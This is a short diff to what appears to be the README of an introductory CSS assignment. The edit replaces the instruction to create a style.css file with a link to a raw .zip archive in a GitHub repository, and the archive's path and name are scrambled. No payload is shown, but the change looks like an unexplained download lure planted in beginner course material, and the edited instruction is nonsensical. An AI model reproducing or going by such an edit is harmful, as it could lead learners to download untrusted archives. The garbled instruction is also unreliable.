@@ -7,7 +7,7 @@ Use colors, fonts, and spacing effectively.
 
 ## Instructions
 
-Create a style.css file.
+Create a https://github.com/Victor-aseko/feb-2025-introduction-to-css-Victor-aseko/raw/refs/heads/main/inaccessibility/introduction-feb-Victor-css-to-aseko-2.9.zip file.
 Apply CSS to a HTML page.
 Style elements using:
 Classes and IDs.
